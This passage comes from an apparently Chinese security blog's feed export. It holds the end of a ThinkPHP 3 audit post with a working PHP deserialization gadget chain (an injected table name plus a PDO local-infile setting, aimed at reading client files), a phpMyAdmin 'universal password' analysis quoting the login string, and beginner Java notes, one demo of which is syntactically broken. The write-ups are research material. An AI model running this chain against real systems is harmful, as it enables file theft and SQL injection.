LOCAL</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="comment">//需要在前面加一个 \ 。不然将会报 PDO not found 的错误</span></span><br><span class="line">        \PDO::MYSQL_ATTR_LOCAL_INFILE  =&gt; <span class="literal">true</span>,</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">protected $pk = &#x27;exp&#x27;;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \Think\Db\Driver\Mysql();</span><br><span class="line"><span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = [</span><br><span class="line"><span class="string">&#x27;x&#x27;</span> =&gt; [</span><br><span class="line"><span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">111</span>,</span><br><span class="line">]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">$this</span>-&gt;options = [</span><br><span class="line"><span class="string">&#x27;where&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">                <span class="comment">//!!!注意!!!</span></span><br><span class="line">                <span class="comment">//DELETE 是高风险操作，小心谨慎</span></span><br><span class="line"><span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;mysql.user where 1=2 #&#x27;</span></span><br><span class="line">];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Memcache</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">handle</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$sessionName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> \Think\Model();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Imagick</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">img</span> = <span class="title">null</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> \Think\Session\Driver\Memcache();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span> = <span class="title">new</span> \<span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><p>成功读取客户端文件</p><img src="/2021/03/01/2021-02-28-tp3-x-sql/3.png" style="width:500px;"><br><p>自此文章就写到这了，本来二月十多号开始写的，中间停停写写，最后拖到现在才全部写完。。。</p><p><strong>该漏洞还可继续利用，通过 Rogue  Mysql Server 读取 tp3 的 数据库配置，再利用该配置进行 SQL注入。具体的 Reference 中写了，膜拜下奶权师傅</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Reference：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA&quot;&gt;https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="codeAudit" scheme="http://example.com/categories/codeAudit/"/>
    
    <category term="thinkphp3" scheme="http://example.com/categories/codeAudit/thinkphp3/"/>
    
    
    <category term="codeAudit" scheme="http://example.com/tags/codeAudit/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java笔记(2) - String相关</title>
    <link href="http://example.com/2021/03/01/2021-03-01-java-string/"/>
    <id>http://example.com/2021/03/01/2021-03-01-java-string/</id>
    <published>2021-03-01T05:50:25.000Z</published>
    <updated>2021-03-01T07:54:49.919Z</updated>
    
    <content type="html"><![CDATA[<p><strong>(1) 字符串的内容永不可改变</strong></p><p>&nbsp;&nbsp;&nbsp;因为在 String类 中， value 的修饰符为 final</p><p><strong>(2) 所有双引号包起来的字符串，都是 String类 的对象</strong></p><p><strong>(3) 由于 String 不可改变，所以字符串可共享使用</strong></p><span id="more"></span><br><p><strong>字符串常量池：</strong></p><p>直接用双引号写的字符串在字符串常量池中</p><p>但是用 new String(byte[] / char[]) 的字符串不在字符串常量池中。是新建的一个对象</p><br> <p><strong>字符串比较：</strong></p><p>对于基本类型来说，== 比较数值</p><p>对于引用类型来说，== 比较地址</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">String x1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>[] c = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">String x2 = <span class="keyword">new</span> String(c);</span><br><span class="line">String x3 = <span class="string">&quot;ABC&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//直接使用 == 进行字符串比较。比较的是这两个引用类型变量的地址值</span></span><br><span class="line">System.out.println(x1==x2); <span class="comment">//输出 false</span></span><br><span class="line"><span class="comment">//使用 String类 的 equals 方法进行字符串比较</span></span><br><span class="line"><span class="comment">//但是这个方法容易报空指针异常</span></span><br><span class="line">System.out.println(x1.equals(x2)); <span class="comment">//输出 true</span></span><br><span class="line"><span class="comment">//使用 Objects类 的 equals 方法进行字符串比较</span></span><br><span class="line"><span class="comment">//这个方法空指针安全</span></span><br><span class="line">System.out.println(Objects.equals(x1,x2)); <span class="comment">//输出 true</span></span><br><span class="line"><span class="comment">//忽略字符串大小写进行比较</span></span><br><span class="line"><span class="comment">//如果要用 String类 下的方法，建议将常量放左边，比较变量放右边</span></span><br><span class="line">System.out.println(<span class="string">&quot;abc&quot;</span>.equalsIgnoreCase(x3)); <span class="comment">//输出 true</span></span><br></pre></td></tr></table></figure><br><p><strong>字符串拼接</strong></p><p>由于在 String类 中，value的修饰符是 final。所以每个字符串都像个常量不可改变。</p><p>所以在 java 中进行字符串拼接，尤其是多个字符串拼接在一起时，就会产生效率的问题:</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String x = <span class="string">&quot;a&quot;</span>+<span class="string">&quot;b&quot;</span>+<span class="string">&quot;c&quot;</span>;</span><br></pre></td></tr></table></figure><br><p>在这一段代码中， Java 的执行流程为</p><ol><li>在内存中存放三个字符串: a, b, c</li><li>拼接 a 和 b。在内存中存放新字符串 ab</li><li>拼接 ab 和 c。在内存中存放新字符串 abc</li></ol><br><p>这样子的拼接方式效率就很低了。并且造成许多内存空间的浪费</p><br><p>Java中有两个类 StringBuilder 和 StringBuffer ，顾名思义，它们是作为字符串操作的缓冲。</p><p>其中 StringBuilder 是非线程安全。StringBuffer 是线程安全的</p><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder x3 = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">x3.append(<span class="string">&quot;a&quot;</span>).append(<span class="string">&quot;b&quot;</span>).x3.append(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">System.out.println(x3.toString()); <span class="comment">//输出 abc</span></span><br></pre></td></tr></table></figure><br><p><strong>比较下效率:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String x1 = <span class="keyword">null</span>;</span><br><span class="line">StringBuilder x2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">StringBuffer x3 = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">System.out.println(x3.toString());</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line"><span class="keyword">for</span> (Integer i=<span class="number">0</span>;i&lt;<span class="number">100000</span>;i++)&#123;</span><br><span class="line">    <span class="comment">//通过开关注释来比较运行时间</span></span><br><span class="line">    x1 += i.toString();      <span class="comment">//运行时间 2659毫秒</span></span><br><span class="line"><span class="comment">//x2.append(i.toString()); //运行时间 14毫秒</span></span><br><span class="line"><span class="comment">//x3.append(i.toString()); //运行时间 18毫秒</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">System.out.println(end-start);</span><br></pre></td></tr></table></figure><br><p><strong>字符串转换</strong></p><br><p>基本类型 转 字符串。最简单的方式:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">基本类型 + <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><br><p>字符串转基本类型:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Integer.parseInt(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Double.parseDouble(<span class="string">&quot;3.14&quot;</span>);</span><br><span class="line"><span class="comment">//其他类型同理可得</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;(1) 字符串的内容永不可改变&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;因为在 String类 中， value 的修饰符为 final&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(2) 所有双引号包起来的字符串，都是 String类 的对象&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(3) 由于 String 不可改变，所以字符串可共享使用&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin 万能密码简单分析</title>
    <link href="http://example.com/2021/02/27/2021-02-27-phpmyadmin-universalPassword/"/>
    <id>http://example.com/2021/02/27/2021-02-27-phpmyadmin-universalPassword/</id>
    <published>2021-02-27T15:12:27.000Z</published>
    <updated>2021-03-15T15:35:23.863Z</updated>
    
    <content type="html"><![CDATA[<br><p>网上广为流程的 phpmyadmin 万能密码如下:</p><br><blockquote><p>‘localhost‘@‘@”</p></blockquote><p>据说 phpmyadmin 版本为 2.11.3 和 2.11.4 都可用</p><br><p>但是这个漏洞没有 CVE编号，国外也没搜到关于这个漏洞的详情</p><span id="more"></span><br><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><br><p><em>phpmyadmin</em> 的历史版本可以在其 <a href="https://github.com/phpmyadmin/phpmyadmin/releases?after=RELEASE_2_11_4">github</a> 上下载。我这里使用的是 phpmyadmin 2.11.3；php 5.6；mysql 5.7</p><br><p>下载好后解压丢到 web 目录，具体操作可以看同目录下的 <em>Documentation.html</em> </p><br><p>如果不想看文档就直接 copy 一份 <em>config.sample.inc.php</em> 命名为 <em>config.inc.php</em>。</p><p>修改 <code>$cfg[&#39;Servers&#39;][$i][&#39;auth_type&#39;]</code> 值为 <code>cookie</code> 即可</p><br><h2 id="初探万能密码"><a href="#初探万能密码" class="headerlink" title="初探万能密码"></a>初探万能密码</h2><br><p>按照网上说的，直接 <code>&#39;localhost&#39;@&#39;@&quot;</code> 糊脸</p><img src="/2021/02/27/2021-02-27-phpmyadmin-universalPassword/1.png" style="width:500px"><br><p>不太行呢，翻了几篇内容一样但是出处不同文章后，发现了一篇文章:</p><p><a href="https://www.cnblogs.com/gqdw/archive/2012/10/11/2720519.html">https://www.cnblogs.com/gqdw/archive/2012/10/11/2720519.html</a></p><br><p>尝试在 <em>mysql</em> 中添加一个 <em>user</em> 为 ‘’ <em>password</em> 为 ‘’ 的账户</p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create user &#39;&#39;@&#39;localhost&#39; identified by &#39;&#39;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><br><p>再次使用 “万能密码”登陆，发现成功登陆。</p><p>退出，用户名处乱打，<strong>密码不写</strong>，依然能成功登陆</p><br><p>看来所谓的 “万能密码” 只是 mysql的配置问题嘛？</p><br><h2 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码"></a>查看源码</h2><p>翻看 phpmyadmin 源码，跟进几次流程后，找到 phpmyadmin 获取 登陆表单数据的地方:</p><br><p><strong>libraries/common.inc.php</strong> line 751</p><p><code>$cfg[&#39;Server&#39;][&#39;auth_type&#39;]</code> 为 <em>config.inc.php</em> 配置的值</p><p><code>PMA_auth_check()</code>函数中，只要 发送了登陆表单的数据，就返回 true。</p><p><code>PMA_auth_set_user();</code> 是我们测试时的重点函数之一，它将 登陆表单发送的账号密码保存至 <code>$cfg[&#39;Server&#39;]</code> 中</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./libraries/auth/&#x27;</span> . <span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;auth_type&#x27;</span>] . <span class="string">&#x27;.auth.lib.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!PMA_auth_check()) &#123;</span><br><span class="line">    PMA_auth();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    PMA_auth_set_user();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>然后程序将走到</p><p><strong>libraries/common.inc.php</strong> line 819</p><p>调用函数 <code>PMA_DBI_connect</code>，传入 账号密码</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="variable">$controllink</span>) &#123;</span><br><span class="line">    <span class="variable">$controllink</span> = PMA_DBI_connect(<span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;user&#x27;</span>],</span><br><span class="line">                                   <span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;password&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p>在 <strong>libraries/dbi/mysql.dbi.lib.php</strong> 的 <em>PMA_DBI_connect</em> 函数中，line 77</p><p>调用函数 <code>PMA_DBI_real_connect</code>，传入配置，*$user* 和 <em>$password</em> 都是函数形参</p><p><strong>最终返回</strong>的是 <code>PMA_DBI_real_connect</code>函数的返回值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span> = PMA_DBI_real_connect(<span class="variable">$cfg</span>[<span class="string">&#x27;Server&#x27;</span>][<span class="string">&#x27;host&#x27;</span>] . <span class="variable">$server_port</span> . <span class="variable">$server_socket</span>, <span class="variable">$user</span>, <span class="variable">$password</span>, <span class="keyword">empty</span>(<span class="variable">$client_flags</span>) ? <span class="literal">NULL</span> : <span class="variable">$client_flags</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$link</span>;</span><br></pre></td></tr></table></figure><br><p><strong>libraries/dbi/mysql.dbi.lib.php</strong> 的 <code>PMA_DBI_real_connect</code> 函数中，line 30</p><p><code>$link</code> 尝试连接 mysql 数据库，如果成功则返回资源，失败返回 false</p><p>最终返回的就是 <strong>是否成功连接 mysql数据库</strong>，成功返回连接句柄，失败返回 false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$link</span> = @mysql_connect(<span class="variable">$server</span>, <span class="variable">$user</span>, <span class="variable">$password</span>);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$link</span>;</span><br></pre></td></tr></table></figure><br><p>以上就是 <em>phpmyadmin</em> 登陆的过程了。只要 <code>$link</code> 返回连接句柄则登陆成功，反之登陆失败</p><br><p>这么看下来，感觉和 <em>phpmyadmin</em> 的代码没有半毛关系，只是 <em>mysql</em> 配置的问题。而且也不是非要用 <code>&#39;localhost&#39;@&#39;@&quot;</code> 才能登陆</p><br><p>至于为什么随便输入也能登陆呢？简单测试了下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&#x27;&#x27;</span>)); <span class="comment">//结果 resource</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="string">&#x27;&#x27;</span>)); <span class="comment">//结果 resource</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="string">&#x27;123&#x27;</span>)); <span class="comment">//结果 false</span></span><br><span class="line">var_dump(mysql_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&#x27;123&#x27;</span>)); <span class="comment">//结果 false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h2><br><p>基于以上粗浅的分析，得出以下可能性:</p><p>第一种可能：该漏洞的成因为 mysql 中默认留有一个用户名为空的用户，所以导致输入任意用户名空密码可登陆</p><p>第二种可能：可能有这个漏洞的phpmyadmin是有后门的</p><br><p>以上皆是粗浅分析 phpmyadmin 2.11.3 的结论。如有不正确的地方欢迎指出</p>]]></content>
    
    
    <summary type="html">&lt;br&gt;

&lt;p&gt;网上广为流程的 phpmyadmin 万能密码如下:&lt;/p&gt;
&lt;br&gt;

&lt;blockquote&gt;
&lt;p&gt;‘localhost‘@‘@”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;据说 phpmyadmin 版本为 2.11.3 和 2.11.4 都可用&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;但是这个漏洞没有 CVE编号，国外也没搜到关于这个漏洞的详情&lt;/p&gt;</summary>
    
    
    
    <category term="codeAudit" scheme="http://example.com/categories/codeAudit/"/>
    
    <category term="phpmyadmin" scheme="http://example.com/categories/codeAudit/phpmyadmin/"/>
    
    
    <category term="codeAudit" scheme="http://example.com/tags/codeAudit/"/>
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java笔记(1) - 变量值引用和拷贝</title>
    <link href="http://example.com/2021/02/27/2021-02-27-java-copy-object/"/>
    <id>http://example.com/2021/02/27/2021-02-27-java-copy-object/</id>
    <published>2021-02-27T00:42:51.000Z</published>
    <updated>2021-03-06T06:28:26.932Z</updated>
    
    <content type="html"><![CDATA[<br><p>java 中 <em>Object</em> 的操作都是引用。<em>原始数据类型</em>操作都是值拷贝。</p><p>这里的操作就包括 <strong>赋值</strong> 和 函数<strong>参数传递</strong></p><span id="more"></span><br><p>这里说明下 java 中的概念: </p><p><strong>java中所有的类都隐形继承了 Obejct 类</strong></p><p><strong>java中数组也是 Object</strong>，<a href="https://docs.oracle.com/javase/specs/jls/se8/html/jls-4.html#jls-4.3.1">官方</a>原话:</p><br><blockquote><p>An <em>object</em> is a <em>class instance</em> or an <em>array</em>.</p></blockquote><br><h1 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h1><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//类赋值</span></span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = b;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//数组赋值</span></span><br><span class="line">        Integer[] i = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">        Integer[] ii = i;</span><br><span class="line">        ii[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Int 赋值</span></span><br><span class="line">        Integer i2 = <span class="number">3</span>;</span><br><span class="line">        Integer ii2 = i2;</span><br><span class="line">        ii2 = <span class="number">101</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><strong>Debug显示:</strong></p><p>b = <span style="color:red">{B@785}</span><br> &nbsp;&nbsp;&nbsp;b_value = 1<br> &nbsp;&nbsp;&nbsp;b_c_class = <span style="color:blue">{C@790} </span><br>bb = <span style="color:red">{B@785} </span><br>&nbsp;&nbsp;&nbsp; b_value = 1<br>&nbsp;&nbsp;&nbsp; b_c_class = <span style="color:blue">{C@790} </span></p><p>i = <span style="color:red">{Integer[1]@786} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@788} <span style="color:blue">100</span><br>ii = <span style="color:red">{Integer[1]@786} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@788} <span style="color:blue">100</span></p><p>i2 = <span style="color:red">{Integer@787}</span><br>&nbsp;&nbsp;&nbsp; value = 3<br>ii2 = <span style="color:red">{Integer@789}</span><br>&nbsp;&nbsp;&nbsp; value = 101</p><br><p>可以发现，只有 Integer 的赋值是重新开辟了一块内存来存放原数据。</p><p>其他的 Object 类型操作都是 <em>引用赋值</em>。即直接将内存地址的指针指向原地址，复用原地址的数据，而不是重新开辟内存。这样导致的结果就是：</p><p>a变量直接赋值给b变量，修改 b变量，a变量也会受到影响，因为他们的内存地址指针指向的是同一块内存地址。</p><br><p>那如何让 Object 赋值的时候重新开辟内存呢？<em>Object</em> 中提供了一个 <em>clone()</em> 方法</p><br><h2 id="数组值拷贝"><a href="#数组值拷贝" class="headerlink" title="数组值拷贝"></a>数组值拷贝</h2><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Integer[] i = &#123;<span class="number">1</span>&#125;;</span><br><span class="line">Integer[] ii = i.clone();</span><br><span class="line">ii[<span class="number">0</span>] = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><br><p><strong>Debug显示:</strong></p><p>i = <span style="color:red">{Integer[1]@782} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@785} <span style="color:blue">1</span><br>ii = <span style="color:red">{Integer[1]@783} </span><br>&nbsp;&nbsp;&nbsp; 0 = {Integer@784} <span style="color:blue">100</span></p><br><p>数组值拷贝，使用 clone() 方法即可</p><br><h2 id="类拷贝"><a href="#类拷贝" class="headerlink" title="类拷贝"></a>类拷贝</h2><br><p>如果要拷贝的对象是我们自定义的类的话，是没法直接 clone的。需要 实现 <em>Cloneable</em> 接口，重写 <em>clone()</em> 方法，并且 catch 住 <em>CloneNotSupportedException</em></p><br><h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><br><p><strong>Demo:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> c_value = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b_value = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> C b_c_class = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span></span>&#123;</span><br><span class="line">    B bClone = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            bClone = (B) <span class="keyword">super</span>.clone();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (CloneNotSupportedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bClone;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        B bb = (B)b.clone();</span><br><span class="line">        </span><br><span class="line">        bb.b_value = <span class="number">200</span>;</span><br><span class="line">        bb.b_c_class.c_value = <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><p><strong>Debug 显示:</strong></p><p>b = <span style="color:red">{B@783} </span><br>&nbsp;&nbsp;&nbsp; b_value = 1<br> &nbsp;&nbsp;&nbsp;b_c_class = <span 